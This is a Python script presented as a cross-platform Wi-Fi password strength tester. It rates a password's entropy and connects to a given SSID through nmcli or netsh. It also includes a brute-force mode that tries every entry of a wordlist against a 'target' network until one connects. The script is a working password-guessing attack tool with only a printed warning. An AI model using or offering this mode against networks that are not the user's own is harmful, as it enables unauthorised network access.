#!/usr/bin/env python3
"""
Wi-Fi Strength Tester (Cross-Platform)
 - Linux: nmcli (preferred)
 - Windows: netsh wlan
 - Optional: wordlist brute-force mode (--bruteforce)
"""

import argparse
import getpass
import math
import os
import platform
import subprocess
import sys
import time

# ---------------- Common Passwords ----------------
COMMON_PASSWORDS = {
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "letmein", "trustno1", "baseball", "iloveyou", "123123",
    "abc123", "password1", "admin", "welcome", "monkey"
}

# ---------------- Password Strength ----------------
def estimate_entropy(password: str) -> float:
    if not password:
        return 0.0
    charset = 0
    if any(c.islower() for c in password): charset += 26
    if any(c.isupper() for c in password): charset += 26
    if any(c.isdigit() for c in password): charset += 10
    if any(not c.isalnum() for c in password): charset += 32
    if charset == 0: charset = 1
    return len(password) * math.log2(charset)

def strength_feedback(password: str):
    length = len(password)
    entropy = estimate_entropy(password)
    score = 0
    if length >= 12: score += 2
    elif length >= 8: score += 1
    if any(c.islower() for c in password) and any(c.isupper() for c in password): score += 1
    if any(c.isdigit() for c in password): score += 1
    if any(not c.isalnum() for c in password): score += 1
    if entropy >= 60: score += 1
    score = max(0, min(6, score))

    labels = {0: "Very weak", 1: "Weak", 2: "Fair", 3: "Good", 4: "Strong", 5: "Very strong", 6: "Excellent"}
    reasons = []
    if password.lower() in COMMON_PASSWORDS: reasons.append("Common password detected")
    if length < 8: reasons.append("Too short (<8 chars)")
    if length < 12: reasons.append("Consider >=12 chars")
    if not any(c.isupper() for c in password): reasons.append("No uppercase letters")
    if not any(c.islower() for c in password): reasons.append("No lowercase letters")
    if not any(c.isdigit() for c in password): reasons.append("No digits")
    if not any(not c.isalnum() for c in password): reasons.append("No symbols")
    if entropy < 40: reasons.append("Entropy <40 bits (weak)")
    elif entropy < 60: reasons.append("Entropy 40–60 bits (moderate)")

    return {"score": score, "label": labels[score], "entropy": entropy, "reasons": reasons}

# ---------------- Connection Methods ----------------
def has_nmcli() -> bool:
    try:
        subprocess.run(["nmcli", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except Exception:
        return False

def try_connect_nmcli(ssid: str, password: str, timeout: int = 20):
    try:
        proc = subprocess.run(
            ["nmcli", "device", "wifi", "connect", ssid, "password", password],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            timeout=timeout, text=True
        )
        return proc.returncode == 0, proc.stdout.strip()
    except Exception as e:
        return False, str(e)

def try_connect_windows_netsh(ssid: str, password: str, timeout: int = 20):
    """
    Attempt to connect to Wi-Fi on Windows using netsh wlan
    """
    try:
        # Create temporary profile XML
        profile = f"""
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
            <name>{ssid}</name>
            <SSIDConfig>
                <SSID>
                    <name>{ssid}</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>auto</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>{password}</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
        </WLANProfile>
        """
        profile_path = f"{ssid}.xml"
        with open(profile_path, "w") as f:
            f.write(profile)

        # Add the profile
        subprocess.run(["netsh", "wlan", "add", f"profile filename={profile_path}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        # Connect
        proc = subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"], capture_output=True, text=True)
        os.remove(profile_path)
        if "successfully" in proc.stdout.lower():
            return True, f"Connected to {ssid} via netsh"
        else:
            return False, proc.stdout.strip()
    except Exception as e:
        return False, str(e)

def try_connect(ssid: str, password: str, timeout: int = 20):
    system = platform.system().lower()
    if system == "linux" and has_nmcli():
        return try_connect_nmcli(ssid, password, timeout)
    elif system == "windows":
        return try_connect_windows_netsh(ssid, password, timeout)
    else:
        return False, f"No supported connection method for {system}"

# ---------------- Wordlist Mode ----------------
def run_wordlist(ssid: str, wordlist_path: str, timeout: int = 10, max_tries: int = None):
    if not os.path.isfile(wordlist_path):
        raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")

    with open(wordlist_path, "r", errors="ignore") as f:
        for idx, line in enumerate(f, start=1):
            if max_tries and idx > max_tries:
                break
            pw = line.strip()
            if not pw:
                continue
            print(f"[{idx}] Trying: {pw}")
            success, out = try_connect(ssid, pw, timeout=timeout)
            if success:
                return True, pw, idx
            else:
                print("  -> FAIL:", out)
            time.sleep(0.5)
    return False, None, None

# ---------------- CLI ----------------
def parse_args():
    p = argparse.ArgumentParser(description="Cross-platform Wi-Fi password tester")
    p.add_argument("--ssid", required=True, help="Target Wi-Fi SSID")
    p.add_argument("--password", help="Password (if omitted, will prompt)")
    p.add_argument("--timeout", type=int, default=20, help="Connection timeout")
    p.add_argument("--no-connect", action="store_true", help="Skip connection test")
    p.add_argument("--wordlist", help="Wordlist file (requires --bruteforce)")
    p.add_argument("--bruteforce", action="store_true", help="Enable wordlist brute-force mode")
    p.add_argument("--max-tries", type=int, help="Limit attempts from wordlist")
    return p.parse_args()

def main():
    args = parse_args()
    ssid = args.ssid
    password = args.password or getpass.getpass("Enter Wi-Fi password: ")

    print("\n== Strength Analysis ==")
    res = strength_feedback(password)
    print(f"Score: {res['score']}/6  ({res['label']})")
    print(f"Entropy: {res['entropy']:.2f} bits, Length: {len(password)}")
    for r in res['reasons']:
        print(" -", r)

    if not args.no_connect:
        print("\n== Connection Test ==")
        success, out = try_connect(ssid, password, timeout=args.timeout)
        print("[+]" if success else "[-]", out)

    if args.bruteforce and args.wordlist:
        print("\n== Wordlist Testing ==")
        print("⚠️ WARNING: This will attempt multiple connections to the target SSID.")
        ok, found_pw, attempt_num = run_wordlist(ssid, args.wordlist, timeout=args.timeout, max_tries=args.max_tries)
        if ok:
            print(f"\n[+] Found password on attempt {attempt_num}: {found_pw}")
        else:
            print("\n[-] Wordlist exhausted, no password found.")

if __name__ == "__main__":
    main()
